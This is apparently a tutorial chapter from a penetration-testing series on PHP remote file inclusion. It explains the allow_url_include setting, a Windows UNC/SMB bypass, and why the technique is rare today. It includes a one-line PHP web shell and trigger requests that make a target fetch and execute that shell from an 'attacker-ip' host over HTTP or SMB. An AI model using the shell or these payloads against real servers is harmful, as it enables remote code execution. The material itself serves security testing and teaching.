# 05 — Remote File Inclusion (RFI)

RFI is the most direct route to RCE in this entire series — when it's
available, you skip every poisoning/encoding trick from files 3 and 4
entirely and just have the server fetch and execute code you're hosting
yourself. It's also, in 2026, the *least* commonly available technique
against modern targets, for reasons this file explains.

## 1. Basic RFI

### Step 1 — host your payload

```php
<?php system($_GET['c']); ?>
```

Save this as `shell.php` and serve it from infrastructure you control, e.g.:

```
python3 -m http.server 80
```

### Step 2 — trigger inclusion of your remote file

```
?page=http://attacker-ip/shell.php&c=id
```

Mechanism:

- The vulnerable `include($_GET['page'] . '.php')` (file 2's baseline
  pattern) now resolves to `include('http://attacker-ip/shell.php.php')` if
  the application still appends `.php` — note the doubled extension problem.
  If the parameter is included *without* a forced extension (some
  applications only append it conditionally, or the parameter is used
  directly), this is simpler: `?page=http://attacker-ip/shell` resolving to
  `include('http://attacker-ip/shell' . '.php')` only works cleanly if you
  name your hosted file to match whatever the app appends, or if there's no
  forced extension at all. Always check both cases before concluding RFI
  doesn't apply.
- When PHP's `include()` receives a URL rather than a local path, and the
  relevant settings allow it (see below), PHP fetches the URL's content over
  HTTP exactly like a normal HTTP client would, then feeds the response body
  to the PHP parser as if it were local source code.
- Your hosted `shell.php` returns plain PHP source with no other content
  around it, so the entire HTTP response body becomes valid input to the
  parser, and `<?php system($_GET['c']); ?>` executes.

### The configuration gate

This **requires both**:
- `allow_url_fopen = On` (the broader "can PHP treat URLs as files at all"
  switch — defaults to On in most installs).
- `allow_url_include = On` (the specific "can *inclusion* functions use a
  remote URL as their source" switch — defaults to **Off** since PHP 5.2,
  released in 2006).

This second default is exactly why classic RFI has become rare: it requires
an administrator to have *actively* re-enabled a setting that's been off by
default for roughly two decades, on a stack that's otherwise current enough
to be in production use. In practice you'll mostly encounter this on:
seriously outdated/abandoned PHP deployments that predate or never adopted
the default change, or environments where a developer explicitly re-enabled
it (sometimes for legitimate-seeming reasons, like dynamically including
remote template fragments) without understanding the implication.

## 2. Confirming the setting before betting time on this path

Before constructing payloads, confirm `allow_url_include` is actually on
rather than guessing — wasted requests against a setting that's almost
certainly off are a poor use of engagement time. Ways to check:

- If you already achieved disclosure via `php://filter` (file 3) and can read
  `phpinfo()` output or a config file, look for the directive directly.
- A single low-risk test request to a URL you control (your own listener) and
  checking your access logs for an inbound hit is a fast, low-noise way to
  confirm — if your listener never sees a request, the setting is off (or
  egress to your IP is blocked, see section 4) and you should move to a
  different technique rather than iterating payload variations against a
  closed door.

## 3. The Windows UNC/SMB path trick

A distinct technique, specific to Windows-hosted PHP, that achieves a similar
result **without needing `allow_url_include` at all**:

```
?page=\\attacker-ip\share\shell
```

Mechanism:

- This isn't a URL — there's no `http://` scheme. It's a **UNC path**
  (Universal Naming Convention), Windows's native syntax for referencing a
  file on a remote SMB share, e.g. `\\server\share\file`.
- PHP's filesystem functions on Windows, including `include()`, are built on
  top of the underlying Windows file APIs, which natively understand UNC
  paths as a normal way to open a file — to the Windows API, "open a file on
  a remote SMB share" and "open a file on the local disk" are both just "open
  a file," handled by the same underlying mechanism.
- Because this is the *local filesystem API's* native remote-file handling,
  not PHP's own `allow_url_*` URL-wrapper layer, `allow_url_include` simply
  never enters the picture — that directive only governs PHP's `http://`,
  `ftp://`, and similar **stream wrapper** handling, not the OS-level SMB
  client built into Windows itself.
- You host `shell.php` on an SMB share you control (on Linux, **Impacket's
  `smbserver.py`** is the standard tool for spinning up a throwaway SMB
  share quickly), point the vulnerable parameter at the UNC path, and the
  Windows host fetches and executes it exactly as if it were a local file.

This is a meaningfully more dangerous bypass than it might first appear,
precisely *because* it sidesteps the one setting most administrators believe
protects them from RFI. If you're testing a Windows-hosted PHP application,
always test this regardless of what `allow_url_include` is set to.

## 4. Why RFI is uncommon against real production targets in 2026

- The `allow_url_include` default change in PHP 5.2 (2006) removed the
  precondition for the overwhelming majority of modern installs.
- Many hosting providers and managed PHP environments (shared hosting,
  containerized deployments using current official PHP images) explicitly
  disable `allow_url_fopen` as well in security-conscious configurations,
  closing off the setting RFI depends on at an even more fundamental level.
- Outbound network egress from web application servers is increasingly
  restricted by network policy in well-run environments specifically to limit
  exactly this class of attack (and to limit SSRF impact generally) —
  even if the PHP-level settings allowed it, a server with no route to the
  public internet, or with an egress allowlist, can't fetch your hosted
  payload at all.

## 5. Real-world notes

- Classic RFI's heyday was roughly the mid-2000s to early 2010s; CVE
  databases from that era are full of WordPress and Joomla plugin RFI
  findings from exactly this period, generally before the PHP 5.2 default
  change had fully propagated across hosting environments.
- In current bug bounty hunting, a confirmed RFI finding against a modern
  target is rare enough that it tends to be treated as a notable/high-profile
  finding precisely because of how unusual the misconfiguration is.
- The Windows UNC trick remains genuinely relevant today specifically because
  it doesn't depend on the legacy setting — if you're assessing
  Windows-hosted PHP (less common than Linux-hosted PHP overall, but not
  rare, especially in enterprise/.NET-adjacent shops that also run PHP
  components), this is worth testing as standard practice, not as a
  long-shot legacy check.

## 6. What's next

File 6 consolidates every technique from files 2–5 into a single cheatsheet,
adds a sensitive-file target list, and gives an honest accounting of what
PortSwigger Web Security Academy does and does not cover for hands-on
practice of everything in this series.
